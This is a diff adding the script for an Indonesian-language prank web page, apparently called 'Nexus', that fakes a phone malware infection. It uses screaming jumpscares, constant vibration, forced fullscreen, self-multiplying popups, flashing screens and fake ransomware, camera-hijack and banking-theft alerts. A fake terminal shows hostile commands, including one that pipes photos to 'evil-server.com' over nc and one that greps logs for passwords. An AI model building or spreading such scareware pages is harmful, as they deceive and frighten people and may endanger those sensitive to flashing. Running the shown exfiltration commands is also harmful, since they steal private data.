+            osc2.stop(now + 300);
+        }
+
+        // --- GLITCH SOUND ---
+        function playGlitchSound(){
+            if(!audioCtx) return;
+
+            const bufferSize = audioCtx.sampleRate * (0.1 + Math.random()*0.3);
+            const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+            const data = buffer.getChannelData(0);
+            for(let i=0; i<bufferSize; i++){
+                data[i] = (Math.random()*2-1) * 0.6;
+            }
+
+            const source = audioCtx.createBufferSource();
+            const gain = audioCtx.createGain();
+            const filter = audioCtx.createBiquadFilter();
+
+            filter.type = 'highpass';
+            filter.frequency.value = 500 + Math.random()*2000;
+
+            source.buffer = buffer;
+            source.connect(filter);
+            filter.connect(gain);
+            gain.connect(audioCtx.destination);
+            gain.gain.value = 0.3;
+            source.start();
+        }
+
+        // --- SCREAM FOR JUMPSCARE ---
+        function playScreamSound(){
+            if(!audioCtx) return;
+
+            const now = audioCtx.currentTime;
+
+            // Layer 1: Harsh oscillator scream
+            const osc1 = audioCtx.createOscillator();
+            const osc2 = audioCtx.createOscillator();
+            const osc3 = audioCtx.createOscillator();
+            const gainMaster = audioCtx.createGain();
+            const distortion = audioCtx.createWaveShaper();
+
+            const curve = new Float32Array(512);
+            for(let i=0;i<512;i++){
+                const x = (i*2)/512 - 1;
+                curve[i] = (Math.PI + 200*x) / (Math.PI + 200*Math.abs(x));
+            }
+            distortion.curve = curve;
+            distortion.oversample = '4x';
+
+            osc1.connect(distortion);
+            osc2.connect(distortion);
+            osc3.connect(distortion);
+            distortion.connect(gainMaster);
+            gainMaster.connect(audioCtx.destination);
+
+            osc1.type = 'sawtooth';
+            osc2.type = 'square';
+            osc3.type = 'sawtooth';
+
+            osc1.frequency.setValueAtTime(100, now);
+            osc1.frequency.exponentialRampToValueAtTime(3000, now + 0.08);
+            osc1.frequency.exponentialRampToValueAtTime(800, now + 0.4);
+            osc1.frequency.exponentialRampToValueAtTime(2500, now + 0.6);
+            osc1.frequency.exponentialRampToValueAtTime(400, now + 1);
+
+            osc2.frequency.setValueAtTime(200, now);
+            osc2.frequency.exponentialRampToValueAtTime(4000, now + 0.1);
+            osc2.frequency.exponentialRampToValueAtTime(1500, now + 0.5);
+
+            osc3.frequency.setValueAtTime(80, now);
+            osc3.frequency.exponentialRampToValueAtTime(500, now + 0.2);
+
+            gainMaster.gain.setValueAtTime(0.9, now);
+            gainMaster.gain.linearRampToValueAtTime(0.7, now + 0.5);
+            gainMaster.gain.linearRampToValueAtTime(0, now + 1.2);
+
+            osc1.start(now); osc2.start(now); osc3.start(now);
+            osc1.stop(now+1.3); osc2.stop(now+1.3); osc3.stop(now+1.3);
+
+            // Layer 2: Noise burst
+            const nBuf = audioCtx.createBuffer(1, audioCtx.sampleRate*1.2, audioCtx.sampleRate);
+            const nData = nBuf.getChannelData(0);
+            for(let i=0;i<nData.length;i++) nData[i] = (Math.random()*2-1);
+
+            const nSrc = audioCtx.createBufferSource();
+            const nGain = audioCtx.createGain();
+            nSrc.buffer = nBuf;
+            nSrc.connect(nGain);
+            nGain.connect(audioCtx.destination);
+            nGain.gain.setValueAtTime(0.8, now);
+            nGain.gain.linearRampToValueAtTime(0, now + 1);
+            nSrc.start(now);
+
+            // Layer 3: Sub bass thump
+            const subOsc = audioCtx.createOscillator();
+            const subGain = audioCtx.createGain();
+            subOsc.connect(subGain);
+            subGain.connect(audioCtx.destination);
+            subOsc.type = 'sine';
+            subOsc.frequency.setValueAtTime(30, now);
+            subOsc.frequency.exponentialRampToValueAtTime(20, now + 0.5);
+            subGain.gain.setValueAtTime(1, now);
+            subGain.gain.linearRampToValueAtTime(0, now + 0.5);
+            subOsc.start(now);
+            subOsc.stop(now + 0.6);
+
+            // Layer 4: High pitched shriek
+            const shriek = audioCtx.createOscillator();
+            const shriekGain = audioCtx.createGain();
+            shriek.connect(shriekGain);
+            shriekGain.connect(audioCtx.destination);
+            shriek.type = 'square';
+            shriek.frequency.setValueAtTime(2000, now);
+            shriek.frequency.linearRampToValueAtTime(5000, now + 0.15);
+            shriek.frequency.linearRampToValueAtTime(3000, now + 0.5);
+            shriekGain.gain.setValueAtTime(0.4, now);
+            shriekGain.gain.linearRampToValueAtTime(0, now + 0.8);
+            shriek.start(now);
+            shriek.stop(now + 0.9);
+        }
+
+        // Start audio on interaction
+        document.addEventListener('touchstart', initAudio, {once:true});
+        document.addEventListener('click', initAudio, {once:true});
+        setTimeout(initAudio, 300);
+
+        // ============================================================
+        // MATRIX RAIN
+        // ============================================================
+        const canvas = document.getElementById('matrixCanvas');
+        const mCtx = canvas.getContext('2d');
+
+        function resizeCanvas(){
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const matrixChars = 'VIRUS HACKED NEXUS TROJAN 010101 ERROR DANGER ☠💀⚠ MALWARE ENCRYPT DESTROY'.split('');
+        const fontSize = 13;
+        let columns = Math.floor(canvas.width/fontSize);
+        let drops = Array(columns).fill(1);
+
+        function drawMatrix(){
+            mCtx.fillStyle = 'rgba(0,0,0,0.06)';
+            mCtx.fillRect(0,0,canvas.width,canvas.height);
+            mCtx.font = fontSize+'px Courier New';
+
+            for(let i=0;i<drops.length;i++){
+                const text = matrixChars[Math.floor(Math.random()*matrixChars.length)];
+                mCtx.fillStyle = Math.random()>0.7 ? '#ff0000' : '#00ff00';
+                mCtx.fillText(text, i*fontSize, drops[i]*fontSize);
+
+                if(drops[i]*fontSize > canvas.height && Math.random()>0.975) drops[i]=0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 45);
+
+        // ============================================================
+        // FAKE DEVICE INFO (meyakinkan)
+        // ============================================================
+        const userAgent = navigator.userAgent;
+        let deviceName = 'Unknown Device';
+        if(/Samsung/i.test(userAgent)) deviceName = 'Samsung Galaxy';
+        else if(/Xiaomi|Redmi|POCO/i.test(userAgent)) deviceName = 'Xiaomi/Redmi';
+        else if(/OPPO/i.test(userAgent)) deviceName = 'OPPO';
+        else if(/vivo/i.test(userAgent)) deviceName = 'Vivo';
+        else if(/Huawei/i.test(userAgent)) deviceName = 'Huawei';
+        else if(/iPhone/i.test(userAgent)) deviceName = 'iPhone';
+        else if(/Android/i.test(userAgent)) deviceName = 'Android Device';
+        else deviceName = 'Mobile Device';
+
+        document.getElementById('devName').textContent = deviceName;
+
+        // Fake IP
+        const fakeIP = `${Math.floor(Math.random()*200)+10}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+        setTimeout(()=>{ document.getElementById('devIP').textContent = fakeIP; }, 1500);
+
+        // Fake location
+        const fakeLocs = ['Jakarta, Indonesia','Surabaya, Indonesia','Bandung, Indonesia','Medan, Indonesia','Semarang, Indonesia','Yogyakarta, Indonesia','Malang, Indonesia','Bekasi, Indonesia','Tangerang, Indonesia'];
+        setTimeout(()=>{
+            document.getElementById('devLoc').textContent = fakeLocs[Math.floor(Math.random()*fakeLocs.length)];
+        }, 3000);
+
+        // Battery
+        if(navigator.getBattery){
+            navigator.getBattery().then(b=>{
+                document.getElementById('devBatt').textContent = Math.floor(b.level*100)+'% (DRAINING FAST!)';
+            });
+        } else {
+            document.getElementById('devBatt').textContent = Math.floor(Math.random()*30+10)+'% (CRITICAL!)';
+        }
+
+        // File encryption counter
+        let encCount = 0;
+        setInterval(()=>{
+            encCount += Math.floor(Math.random()*50+10);
+            if(encCount > 12847) encCount = 12847;
+            document.getElementById('filesEnc').textContent = encCount.toLocaleString() + ' / 12,847';
+        }, 500);
+
+        // ============================================================
+        // FAKE POPUP SYSTEM
+        // ============================================================
+        const popupMessages = [
+            {title:'⚠️ VIRUS DETECTED', body:'Trojan.Nexus.v6.66 telah menginfeksi kernel sistem!', btn:'Scan Now'},
+            {title:'🔴 CRITICAL ERROR', body:'File system corrupted. Semua foto & video sedang dienkripsi...', btn:'Fix Now'},
+            {title:'💀 DATA BREACH', body:'Kontak, pesan WhatsApp, dan foto pribadi sedang dikirim ke server asing.', btn:'Stop'},
+            {title:'⛔ RANSOMWARE', body:'Bayar 999 BTC dalam 5 menit atau semua data dihapus permanen!', btn:'Pay Now'},
+            {title:'☠️ NEXUS MALWARE', body:'nexus_rootkit.exe berjalan sebagai SYSTEM. Tidak bisa dihentikan.', btn:'Force Stop'},
+            {title:'🔥 OVERHEAT WARNING', body:'CPU: 99.8°C — Perangkat akan shutdown paksa untuk mencegah kerusakan!', btn:'Cool Down'},
+            {title:'📱 CAMERA HIJACKED', body:'Kamera depan & belakang aktif. Merekam ke server...', btn:'Block Camera'},
+            {title:'🎤 MIC ACTIVE', body:'Mikrofon sedang merekam percakapan Anda secara real-time!', btn:'Mute'},
+            {title:'💳 BANKING ALERT', body:'Aplikasi banking terdeteksi! Mengekstrak data kartu kredit...', btn:'Secure Now'},
+            {title:'👁️ KEYLOGGER ACTIVE', body:'Semua ketikan Anda direkam termasuk password & PIN!', btn:'Remove'},
+            {title:'📡 GPS TRACKING', body:'Lokasi real-time Anda sedang dikirim. Seseorang mengawasi Anda.', btn:'Disable GPS'},
+            {title:'🔓 LOCK BYPASS', body:'Screen lock berhasil dibypass. Perangkat fully accessible.', btn:'Re-lock'},
+        ];
+
+        let popupCount = 0;
+
+        function spawnPopup(){
+            if(popupCount > 20) return;
+            popupCount++;
+
+            const popup = document.createElement('div');
+            popup.className = 'fake-popup';
+            const msg = popupMessages[Math.floor(Math.random()*popupMessages.length)];
+
+            const x = Math.random()*(window.innerWidth-260);
+            const y = 50 + Math.random()*(window.innerHeight-200);
+
+            popup.style.left = x+'px';
+            popup.style.top = y+'px';
+            popup.style.zIndex = 20+popupCount;
+
+            popup.innerHTML = `
+                <div class="popup-header">
+                    <span>${msg.title}</span>
+                    <span class="popup-x">✕</span>
+                </div>
+                <div class="popup-body">${msg.body}</div>
+                <button class="popup-btn">${msg.btn}</button>
+            `;
+
+            document.body.appendChild(popup);
+
+            // Clicking X or button spawns MORE
+            popup.querySelector('.popup-x').addEventListener('click', function(e){
+                e.stopPropagation();
+                spawnPopup(); spawnPopup(); spawnPopup();
+                playGlitchSound();
+            });
+            popup.querySelector('.popup-btn').addEventListener('click', function(e){
+                e.stopPropagation();
+                spawnPopup(); spawnPopup();
+                flashScreen();
+                playGlitchSound();
+            });
+
+            setTimeout(()=>{
+                if(popup.parentNode){ popup.parentNode.removeChild(popup); popupCount--; }
+            }, 6000);
+        }
+
+        // ============================================================
+        // FLYING ERRORS
+        // ============================================================
+        const errorTexts = [
+            '⚠️ ERROR 0xDEAD','💀 SYSTEM FAILURE','🔴 SPREADING...','☠️ DATA LOST',
+            '⛔ NO ESCAPE','🚨 ALERT!','🔥 BURNING!','💣 BOOM!','👾 HACKED!',
+            '🤣 KENA LO!','💀 RIP DATA','🦠 INFECTED','🔓 CRACKED',
+            '📡 TRANSMITTING...','🎤 RECORDING...','📸 CAPTURING...'
+        ];
+
+        function spawnFlyingError(){
+            const err = document.createElement('div');
+            err.className = 'flying-error';
+            err.textContent = errorTexts[Math.floor(Math.random()*errorTexts.length)];
+            err.style.left = Math.random()*window.innerWidth+'px';
+            err.style.top = Math.random()*window.innerHeight+'px';
+            err.style.fontSize = (Math.random()*2+0.7)+'rem';
+            document.body.appendChild(err);
+            setTimeout(()=>{ if(err.parentNode) err.parentNode.removeChild(err); }, 2500);
+        }
+
+        // ============================================================
+        // FLASH & JUMPSCARE
+        // ============================================================
+        function flashScreen(){
+            const flash = document.createElement('div');
+            flash.className = 'flash';
+            document.body.appendChild(flash);
+            setTimeout(()=>{ if(flash.parentNode) flash.parentNode.removeChild(flash); }, 400);
+        }
+
+        let jumpscareActive = false;
+
+        function triggerJumpscare(){
+            if(jumpscareActive) return;
+            jumpscareActive = true;
+
+            const js = document.getElementById('jumpscare');
+            js.style.display = 'flex';
+
+            playScreamSound();
+            flashScreen();
+            vibratePhone();
+
+            // Intensify shaking
+            document.getElementById('mainContent').style.animation = 'shakeHard 0.06s infinite';
+
+            const faces = ['👹','👺','💀','☠️','👻','😱','🤡','👿','🫣','😈'];
+            let fIdx = 0;
+            const faceInt = setInterval(()=>{
+                js.querySelector('.scare-face').textContent = faces[fIdx % faces.length];
+                fIdx++;
+                flashScreen();
+            }, 80);
+
+            setTimeout(()=>{
+                js.style.display = 'none';
+                jumpscareActive = false;
+                clearInterval(faceInt);
+                document.getElementById('mainContent').style.animation = 'shake 0.12s infinite';
+            }, 2000);
+        }
+
+        // ============================================================
+        // VIBRATION
+        // ============================================================
+        function vibratePhone(){
+            if(navigator.vibrate){
+                navigator.vibrate([100,50,100,50,200,100,300,50,100,50,200,100,500]);
+            }
+        }
+        setInterval(vibratePhone, 2500);
+        vibratePhone();
+
+        // ============================================================
+        // COUNTDOWN TIMER (fake self-destruct)
+        // ============================================================
+        let timeLeft = 300; // 5 minutes
+        function updateCountdown(){
+            const min = Math.floor(timeLeft/60);
+            const sec = timeLeft%60;
+            document.getElementById('countdown').textContent =
+                `💣 SELF-DESTRUCT: ${String(min).padStart(2,'0')}:${String(sec).padStart(2,'0')}`;
+
+            if(timeLeft <= 60){
+                document.getElementById('countdown').style.color = '#ff0000';
+                document.getElementById('countdown').style.fontSize = 'clamp(2rem,8vw,4rem)';
+            }
+
+            if(timeLeft <= 0){
+                // Fake "explosion" - just jumpscare
+                triggerJumpscare();
+                timeLeft = 300;
+            }
+            timeLeft--;
+        }
+        setInterval(updateCountdown, 1000);
+
+        // ============================================================
+        // PROGRESS BAR PERCENT
+        // ============================================================
+        let fakePercent = 0;
+        setInterval(()=>{
+            fakePercent += Math.random()*2;
+            if(fakePercent > 99.9) fakePercent = 99.9;
+            document.getElementById('percentText').textContent = fakePercent.toFixed(1)+'%';
+        }, 500);
+
+        // ============================================================
+        // TERMINAL LINES
+        // ============================================================
+        const termLines = [
+            'root@nexus:~# ./encrypt_all_data.sh --force --no-backup',
+            'root@nexus:~# cat /sdcard/DCIM/* | nc evil-server.com 4444',
+            'root@nexus:~# dumpsys contacts > /tmp/stolen_contacts.db',
+            'root@nexus:~# am start -n com.android.camera/.CameraActivity',
+            'root@nexus:~# screenrecord /sdcard/victim_screen.mp4',
+            'root@nexus:~# logcat | grep -i password >> /tmp/creds.txt',
+            '[NEXUS] Uploading WhatsApp database... 78% complete',
+            '[NEXUS] SMS history extracted: 2,847 messages',
+            '[NEXUS] Gallery photos: 1,293 files queued for upload',
+            '[NEXUS] Banking app detected: com.bca.mobile - extracting...',
+            '[NEXUS] WiFi passwords dumped: 12 networks',
+            '[NEXUS] Root access: GRANTED ✓',
+            '[NEXUS] SELinux: DISABLED ✓',
+            '[NEXUS] Firewall: BYPASSED ✓',
+            'WARNING: Device owner changed to NEXUS-CONTROL',
+        ];
+
+        let termIdx = 0;
+        setInterval(()=>{
+            termIdx = (termIdx+1) % termLines.length;
+            document.getElementById('terminalLine').textContent = termLines[termIdx];
+        }, 2000);
+
+        // ============================================================
+        // NEXUS MESSAGES
+        // ============================================================
+        const nexusMsgs = [
+            '📝 Catatan Nexus: Wok kena virus kan 🤣🤣🤣',
+            '📝 Catatan Nexus: Jangan panik... eh panik aja deng 😂💀',
+            '📝 Catatan Nexus: HP lo udah gw ambil alih wkwkwk',
+            '📝 Catatan Nexus: Coba keluar... gak bisa kan? 🤭',
+            '📝 Catatan Nexus: Data lo udah gw download semua 😈',
+            '📝 Catatan Nexus: Foto-foto lo bagus juga ya 📸🤣',
+            '📝 Catatan Nexus: Salam dari Nexus! Bye bye data~ 👋💀',
+            '📝 Catatan Nexus: Matiin aja HP nya kalo berani 😏',
+            '📝 Catatan Nexus: Lo pikir tombol back bisa nyelametin? 🤡',
+            '📝 Catatan Nexus: Chat WA lo udah gw baca semua loh 👀',
+        ];
+
+        let nexIdx = 0;
+        setInterval(()=>{
+            nexIdx = (nexIdx+1) % nexusMsgs.length;
+            document.getElementById('nexusMsg').textContent = nexusMsgs[nexIdx];
+        }, 3500);
+
+        // ============================================================
+        // VIRUS SUBTITLE MESSAGES
+        // ============================================================
+        const subMsgs = [
+            '⚠️ Ditemukan 47 malware aktif di perangkat Anda',
+            '🔴 Semua file sedang dienkripsi dengan AES-256',
+            '☠️ Kontak Anda sedang dikirim ke server eksternal',
+            '💀 Foto & video pribadi terdeteksi dan sedang diupload',
+            '🦠 Worm sedang menyebar ke kontak WhatsApp Anda',
+            '📡 Lokasi GPS Anda sedang dilacak secara real-time',
+            '🔓 Semua password tersimpan berhasil diekstrak',
+            '🎤 Mikrofon aktif — merekam percakapan Anda',
+        ];
+
+        let subIdx = 0;
+        setInterval(()=>{
+            subIdx = (subIdx+1) % subMsgs.length;
+            document.getElementById('virusSub').textContent = subMsgs[subIdx];
+        }, 2500);
+
+        // ============================================================
+        // FILE LIST UPDATE
+        // ============================================================
+        const fakeFiles = [
+            '🔒 /DCIM/Camera/IMG_20240115_*.jpg',
+            '🔒 /WhatsApp/Media/WhatsApp Images/',
+            '🔒 /Documents/Tugas_Sekolah.docx',
+            '🔒 /Download/foto_mantan.jpg',
+            '🔒 /Music/*.mp3',
+            '🔒 /Android/data/com.instagram.android/',
+            '🔒 /TikTok/Downloads/*.mp4',
+            '🔒 /DCIM/Screenshots/*.png',
+            '🔒 /WhatsApp/Databases/msgstore.db',
+            '🔒 /data/data/com.whatsapp/shared_prefs/',
+        ];
+
+        setInterval(()=>{
+            const fl = document.getElementById('fileList');
+            fl.innerHTML = '';
+            for(let i=0; i<3; i++){
+                const div = document.createElement('div');
+                div.textContent = fakeFiles[Math.floor(Math.random()*fakeFiles.length)];
+                div.style.animationDelay = (i*0.1)+'s';
+                fl.appendChild(div);
+            }
+        }, 1500);
+
+        // ============================================================
+        // HEX CODES
+        // ============================================================
+        function spawnHexCode(){
+            const hex = document.createElement('div');
+            hex.className = 'hex-code';
+            let code = '';
+            for(let i=0;i<40;i++){
+                code += Math.floor(Math.random()*16).toString(16).toUpperCase();
+                if(i%4===3) code+=' ';
+            }
+            hex.textContent = code;
+            hex.style.left = Math.random()*window.innerWidth+'px';
+            hex.style.top = Math.random()*window.innerHeight+'px';
+            hex.style.transform = `rotate(${Math.random()*30-15}deg)`;
+            document.body.appendChild(hex);
+            setTimeout(()=>{ if(hex.parentNode) hex.parentNode.removeChild(hex); }, 3000);
+        }
+        setInterval(spawnHexCode, 400);
+
+        // ============================================================
+        // AUTO SPAWNERS
+        // ============================================================
+        setInterval(spawnPopup, 1800);
+        setInterval(spawnFlyingError, 600);
+        setInterval(flashScreen, 5000);
+
+        // Periodic jumpscares
+        setInterval(()=>{
+            if(Math.random()>0.5) triggerJumpscare();
+        }, 10000);
+
+        // First jumpscare at 4 seconds
+        setTimeout(triggerJumpscare, 4000);
+
+        // ============================================================
+        // SKULL ANIMATION
+        // ============================================================
+        const skulls = ['💀','☠️','👹','👺','👻','👿','😈','🤡','👾'];
+        let skIdx = 0;
+        setInterval(()=>{
+            skIdx = (skIdx+1)%skulls.length;
+            document.getElementById('mainSkull').textContent = skulls[skIdx];
+        }, 800);
+
+        // ============================================================
+        // INITIAL BURST
+        // ============================================================
+        setTimeout(()=>{
+            for(let i=0;i<8;i++) setTimeout(spawnPopup, i*200);
+        }, 1000);
+
+        // ============================================================
+        // FULLSCREEN
+        // ============================================================
+        document.addEventListener('click', function(){
+            try{
+                const el = document.documentElement;
+                if(el.requestFullscreen) el.requestFullscreen();
+                else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+            }catch(e){}
+        }, {once:true});
+
+        // ============================================================
+        // RANDOM INTENSE MOMENTS
+        // ============================================================
+        setInterval(()=>{
+            // Random intense shake
+            document.getElementById('mainContent').style.animation = 'shakeHard 0.06s infinite';
+            setTimeout(()=>{
+                document.getElementById('mainContent').style.animation = 'shake 0.12s infinite';
+            }, 2000);
+        }, 15000);
+
+        // Console
+        console.log('%c☠️ NEXUS MALWARE ACTIVE ☠️','color:red;font-size:40px;font-weight:bold;');
+        console.log('%cRelax... ini cuma prank 😂','color:green;font-size:16px;');
+    </script>
+</body>
+</html>
